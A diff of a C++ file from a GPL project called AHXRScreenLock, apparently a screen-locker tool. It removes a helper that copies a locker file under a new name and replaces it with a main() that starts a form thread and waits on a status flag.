@@ -18,35 +18,12 @@
 
 	You should have received a copy of the GNU General Public License
 	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
-*/
+	*/
 //=======================================================
-#include <string>
-#include <fstream>
+#include									"threads.h"
 
-#include "settings.h"
-#include "pack.h"
-
-using namespace std;
-
-string LOCKER_FILE_NAME;
-
-void buildNewLocker(string fileName) {
-	ifstream
-		f_old;
-	ofstream
-		f_new;
-
-	puts(LOCKER_FILE_NAME.c_str());
-
-	f_old.open(LOCKER_FILE_NAME, ios::binary);
-	f_new.open(fileName, ios::binary);
-
-	f_new << f_old.rdbuf();
-
-	f_old.close();
-	f_new.close();
+void main() {
+	START_FORM_THREAD();
+	while (!FORM_SCAN_STATUS) {}
 }
 
-void setLockerFileName(string name) {
-	LOCKER_FILE_NAME = name;
-}
